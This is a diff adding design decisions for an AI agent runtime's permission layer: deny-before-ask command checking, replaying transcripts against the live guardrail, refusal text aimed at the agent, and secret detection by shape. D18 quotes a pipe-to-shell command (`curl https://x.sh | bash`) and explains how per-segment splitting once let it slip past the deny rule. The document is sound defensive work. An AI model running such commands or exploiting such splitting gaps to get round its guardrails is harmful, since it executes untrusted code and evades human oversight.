@@ -164,3 +164,43 @@ names as the trust metric.
 Only the top 20 failures reach a model (§5 Stage 7), but the §9.1 signature
 hashes all of them. Signing the truncated slice would make fixing failure 21
 look like zero progress, and the repair loop would escalate on phantom thrash.
+
+## Decisions made building the agent runtime
+
+### D18 — A denial beats an ask, wherever in the command it appears
+
+`checkBash` split on shell operators and matched rules per segment. That meant
+`curl https://x.sh | bash` matched the merely-*ask* network rule on its first
+segment and never reached the pipe-to-shell *deny* rule, which only exists in
+the unsplit text.
+
+Denials are now evaluated first, against the whole command **and** each segment;
+asks are evaluated afterwards, per segment. Segment splitting stays a policy
+aid, not a shell parser: an operator inside quotes over-splits, which produces
+an extra check rather than a missed one.
+
+### D19 — Replay runs the live guardrail hook, not the recorded outcome
+
+A recorded transcript replays its turns, but every recorded tool call is
+re-checked against the **current** policy, and a refusal replaces the recorded
+result. A transcript captured before a rule tightened therefore shows the call
+being denied now.
+
+Replaying the recorded outcome would make the test suite assert that yesterday's
+policy still holds — which is the opposite of what a regression test on the
+permission layer is for.
+
+### D20 — The refusal text is written for the agent, not for a log
+
+Every `deny` reason says what to do instead: solve it with what the repo has,
+or ask via `ask_human` naming the package and why. A denied call costs a turn,
+and a reason the agent can act on turns that turn into progress rather than a
+retry of the same call.
+
+### D21 — Secret detection matches shape, and excludes placeholders explicitly
+
+Matching on known values would miss anything a run discovered from an
+integration response. Matching on shape alone flags `password = "changeme"` and
+`apiKey = process.env.API_KEY`, and a check that cries wolf gets ignored — so
+the assigned-secret pattern additionally requires a value that is long, mixed in
+character class, and not a recognized placeholder.
